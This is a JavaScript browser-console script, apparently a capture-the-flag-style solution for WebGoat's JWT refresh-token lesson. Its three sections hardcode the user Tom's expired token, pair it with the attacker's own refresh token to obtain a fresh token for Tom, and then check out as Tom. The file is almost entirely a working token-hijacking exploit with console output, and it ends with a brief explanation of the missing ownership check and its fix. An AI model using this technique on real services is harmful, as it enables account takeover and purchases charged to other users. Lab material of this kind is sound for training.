// ═══════════════════════════════════════════════════════════
// JWT REFRESH ATTACK - GUARANTEED OUTPUT VERSION
// Each section is COMPLETELY SELF-CONTAINED
// Copy ONE section at a time, paste, press Enter
// ═══════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════
// SECTION 1: SETUP & SET YOUR REFRESH TOKEN
// ═══════════════════════════════════════════════════════════

(function() {
    console.log('═══════════════════════════════════════════════════════');
    console.log('[SECTION 1] SETUP');
    console.log('═══════════════════════════════════════════════════════');
    
    // Tom's expired token
    window.TOMS_EXPIRED = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';
    
    console.log('✓ Tom\'s expired token saved');
    console.log('  Preview:', window.TOMS_EXPIRED.substring(0, 40) + '...');
    
    try {
        const decoded = JSON.parse(atob(window.TOMS_EXPIRED.split('.')[1]));
        console.log('  User:', decoded.user);
        console.log('  Expired:', new Date(decoded.exp * 1000).toLocaleString());
    } catch (e) {
        console.log('  (Decode error:', e.message + ')');
    }
    
    console.log('\n✅ Section 1 complete!');
    console.log('\n⚠️ BEFORE RUNNING SECTION 2:');
    console.log('Set your refresh token:');
    console.log('   window.myRefreshToken = "PASTE_YOUR_ACTUAL_REFRESH_TOKEN_HERE";');
    console.log('\nThen run Section 2.');
})();

// ═══════════════════════════════════════════════════════════
// SECTION 2: GET TOM'S NEW TOKEN (Run AFTER setting myRefreshToken)
// ═══════════════════════════════════════════════════════════

(function() {
    console.log('═══════════════════════════════════════════════════════');
    console.log('[SECTION 2] GET TOM\'S NEW TOKEN');
    console.log('═══════════════════════════════════════════════════════');
    
    // Check if tokens are set
    console.log('[Step 1] Checking tokens...');
    
    if (typeof window.TOMS_EXPIRED === 'undefined') {
        console.log('%c❌ ERROR: Tom\'s token not found!', 'color: red; font-weight: bold; background: #ffcccc; padding: 5px');
        console.log('Run SECTION 1 first!');
        return;
    }
    console.log('✓ Tom\'s token: OK');
    
    if (typeof window.myRefreshToken === 'undefined' || !window.myRefreshToken) {
        console.log('%c❌ ERROR: Your refresh token not set!', 'color: red; font-weight: bold; background: #ffcccc; padding: 5px');
        console.log('\nYou need to set it first:');
        console.log('   window.myRefreshToken = "PASTE_YOUR_ACTUAL_REFRESH_TOKEN_HERE";');
        console.log('\nThen re-run this section.');
        return;
    }
    console.log('✓ Your refresh token: OK');
    console.log('  Length:', window.myRefreshToken.length);
    console.log('  Preview:', window.myRefreshToken.substring(0, 40) + '...');
    
    // Make the request
    console.log('\n[Step 2] Sending refresh request...');
    console.log('  URL: /WebGoat/JWT/refresh/newToken');
    console.log('  Method: POST');
    console.log('  Authorization: Bearer <Tom\'s expired token>');
    console.log('  Body: {"refresh_token": "<your token>"}');
    
    fetch('/WebGoat/JWT/refresh/newToken', {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer ' + window.TOMS_EXPIRED,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 
            refresh_token: window.myRefreshToken 
        })
    })
    .then(response => {
        console.log('\n[Step 3] Response received!');
        console.log('  Status:', response.status, response.statusText);
        console.log('  OK:', response.ok);
        
        if (!response.ok) {
            return response.text().then(text => {
                console.log('%c❌ Request failed!', 'color: red; font-weight: bold');
                console.log('Response body:', text.substring(0, 200));
                throw new Error('HTTP ' + response.status);
            });
        }
        
        return response.json();
    })
    .then(data => {
        console.log('\n[Step 4] Parsing response...');
        console.log('Response data:', data);
        
        if (!data.access_token) {
            console.log('%c⚠️ No access_token in response!', 'color: orange; font-weight: bold');
            console.log('Response keys:', Object.keys(data));
            return;
        }
        
        console.log('\n[Step 5] Saving Tom\'s new token...');
        window.tomsNewToken = data.access_token;
        console.log('✓ Saved to: window.tomsNewToken');
        
        // Decode and verify
        try {
            const decoded = JSON.parse(atob(data.access_token.split('.')[1]));
            console.log('\n[Step 6] Verifying token...');
            console.log('Token payload:', decoded);
            console.log('User:', decoded.user);
            
            if (decoded.user === 'Tom') {
                console.log('\n%c✅ SUCCESS! Got Tom\'s token!', 'color: white; background: green; font-size: 18px; font-weight: bold; padding: 10px');
                console.log('\n✅ Section 2 complete!');
                console.log('\n🚀 Now run SECTION 3 to checkout!');
            } else {
                console.log('\n%c⚠️ Token user is:', decoded.user, 'color: orange; font-weight: bold');
                console.log('Expected: Tom');
                console.log('The attack may not have worked.');
            }
        } catch (e) {
            console.log('Decode error:', e.message);
        }
    })
    .catch(error => {
        console.log('\n%c❌ ERROR!', 'color: red; font-weight: bold; font-size: 16px');
        console.log('Error:', error.message);
        console.log('Full error:', error);
        
        console.log('\n📋 Troubleshooting:');
        console.log('1. Check Network tab (F12) for the actual request/response');
        console.log('2. Make sure you\'re on the "Refreshing a token" lesson');
        console.log('3. Try getting a fresh refresh token');
        console.log('4. Check if window.myRefreshToken is correct');
    });
})();

// ═══════════════════════════════════════════════════════════
// SECTION 3: CHECKOUT AS TOM (Run AFTER Section 2 succeeds)
// ═══════════════════════════════════════════════════════════

(function() {
    console.log('═══════════════════════════════════════════════════════');
    console.log('[SECTION 3] CHECKOUT AS TOM');
    console.log('═══════════════════════════════════════════════════════');
    
    console.log('[Step 1] Checking if Tom\'s token is ready...');
    
    if (typeof window.tomsNewToken === 'undefined' || !window.tomsNewToken) {
        console.log('%c❌ ERROR: Tom\'s new token not found!', 'color: red; font-weight: bold; background: #ffcccc; padding: 5px');
        console.log('\nYou need to run SECTION 2 first!');
        console.log('SECTION 2 should save Tom\'s token to: window.tomsNewToken');
        return;
    }
    
    console.log('✓ Tom\'s new token found!');
    console.log('  Token:', window.tomsNewToken.substring(0, 40) + '...');
    
    console.log('\n[Step 2] Sending checkout request...');
    console.log('  URL: /WebGoat/JWT/refresh/checkout');
    console.log('  Method: POST');
    console.log('  Authorization: Bearer <Tom\'s NEW token>');
    
    fetch('/WebGoat/JWT/refresh/checkout', {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer ' + window.tomsNewToken,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest'
        }
    })
    .then(response => {
        console.log('\n[Step 3] Response received!');
        console.log('  Status:', response.status, response.statusText);
        return response.json();
    })
    .then(data => {
        console.log('\n[Step 4] Checkout response:');
        console.log(data);
        
        if (data.lessonCompleted === true) {
            console.log('\n%c═══════════════════════════════════════════════════════', 'color: green; font-size: 14px');
            console.log('%c🎉 SUCCESS! TOM PAID FOR THE BOOKS! 💰', 'color: white; background: green; font-size: 24px; font-weight: bold; padding: 15px');
            console.log('%c═══════════════════════════════════════════════════════', 'color: green; font-size: 14px');
            
            console.log('\n✅ Challenge Complete!');
            console.log('Tom\'s credit card: -$31.53 📉');
            console.log('Your wallet: Saved! 💵');
            console.log('WebGoat lesson: PWNED ✅');
            
            console.log('\n📚 What you learned:');
            console.log('Refresh token manipulation vulnerability:');
            console.log('- Server validated refresh token but didn\'t check ownership');
            console.log('- We used Tom\'s expired token + our refresh token');
            console.log('- Server issued NEW token for Tom!');
            console.log('- Fix: Server must verify refresh_token.user === access_token.user');
            
        } else {
            console.log('\n%c⚠️ Checkout completed but lesson not marked as done', 'color: orange; font-weight: bold');
            console.log('Feedback:', data.feedback);
            console.log('Assignment:', data.assignment);
            console.log('Attempted:', data.attemptWasMade);
            
            if (data.feedback && data.feedback.includes('Jerry')) {
                console.log('\n%c❌ The token still has user=Jerry!', 'color: red; font-weight: bold');
                console.log('The refresh token manipulation attack did not work.');
                console.log('Possible reasons:');
                console.log('1. Server is correctly validating token ownership');
                console.log('2. Wrong refresh token was used');
                console.log('3. Tom\'s expired token format not accepted');
            }
        }
    })
    .catch(error => {
        console.log('\n%c❌ CHECKOUT ERROR!', 'color: red; font-weight: bold; font-size: 16px');
        console.log('Error:', error.message);
        console.log('Full error:', error);
    });
})();
